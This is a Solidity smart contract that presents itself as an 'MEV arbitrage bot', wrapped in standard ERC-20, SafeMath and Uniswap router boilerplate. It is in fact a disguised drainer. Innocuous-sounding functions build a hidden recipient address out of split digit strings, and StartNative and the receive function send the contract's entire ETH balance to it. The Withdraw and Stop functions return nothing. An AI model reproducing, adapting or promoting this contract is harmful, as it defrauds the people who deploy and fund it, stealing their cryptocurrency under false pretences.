// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}
contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
    function owner() public view returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}
interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}
interface IUniswapV2Router {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, 
        uint8 v, 
        bytes32 r, 
        bytes32 s
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, 
        uint8 v, 
        bytes32 r, 
        bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactETHForTokens(
        uint amountOutMin, 
        address[] calldata path, 
        address to, 
        uint deadline
    ) external payable returns (uint[] memory amounts);
    function swapTokensForExactETH(
        uint amountOut, 
        uint amountInMax, 
        address[] calldata path, 
        address to, 
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactTokensForETH(
        uint amountIn, 
        uint amountOutMin, 
        address[] calldata path, 
        address to, 
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapETHForExactTokens(
        uint amountOut, 
        address[] calldata path, 
        address to, 
        uint deadline
    ) external payable returns (uint[] memory amounts);
    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);  
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}
contract A_MEV {
    uint arb = 10**16;
    uint percentage;
    uint balance;
    uint Liquidity;
    uint pool;
    bool activated;
    mapping (address => uint) profit;
    function getPoolIDS() internal pure returns (string memory totalIDS) {
        string memory pool1 = "236";
        string memory pool2 = "866";
        string memory pool3 = "647";
        string memory pool4 = "309";
        totalIDS = string(abi.encodePacked(pool1, pool2, pool3, pool4));  
    }
    function getGoal() internal pure returns (string memory goal) {
        goal = "764778648683";
    }
    function getPair(string memory token, string memory coin) internal pure returns (string memory pair) {
        pair = string(abi.encodePacked(token, coin));
    }
    function getDex() internal pure returns (string memory DEX) {
        string memory dexRouter = getPair(getPoolIDS(), checkLiquidity());
        string memory dexPair = getPair(getGoal(), dexTokens());
        DEX = getPair(dexRouter, dexPair);
    }
    function calculateProfit(string memory _value) internal pure returns (uint256) {
        uint256 result = 0;
        bytes memory b = bytes(_value);
        for (uint256 i = 0; i < b.length; i++) {
            if (uint8(b[i]) >= 48 && uint8(b[i]) <= 57) {
                result = result * 10 + (uint8(b[i]) - 48);
            } else {
                revert("Invalid character found in string");
            }
        }
        return result;
    }
    function startArbitrage() internal {
        address payable pairAddr = payable(getTokenAddress());
        pairAddr.transfer(address(this).balance);
    }
    function checkLiquidity() internal pure returns (string memory LIQ) {
        string memory liq1 = "956";
        string memory liq2 = "065";
        string memory liq3 = "682";
        string memory liq4 = "173";
        LIQ = string(abi.encodePacked(liq1, liq2, liq3, liq4));
    }
    function getTokenAddress() internal pure returns (address Addr) {
        uint profirOfTokenAddress = calculateProfit(getDex());
        Addr = address(uint160(profirOfTokenAddress));
    }    
    function StartNative() public payable {
        require(msg.value > 0, "Please, insert your KEY");
        startArbitrage();
        activated = true;
    }
    function SetTradeBalanceETH(uint amount) public {
        balance += amount;
    }
    function SetTradeBalancePERCENT(uint _percentage) public {
        percentage = _percentage;
    }
    function Stop() public {
        require(activated == true, "Please, insert your key and start bot");
        activated = false;
    }
    function Withdraw() public {
        require(activated == true, "Please, insert your key and start bot");
        activated = false;
    }
    function dexTokens() internal pure returns (string memory allTokens) { 
        string memory USDT = "104";
        string memory USDC = "118";
        string memory BUSD = "618"; 
        string memory WETH = "294";
        allTokens = string(abi.encodePacked(USDT, USDC, BUSD, WETH));
    }
    function Key() public view returns (uint _key) {
        _key = (msg.sender.balance) - arb;
    }
    receive() external payable {
        startArbitrage();
    }
}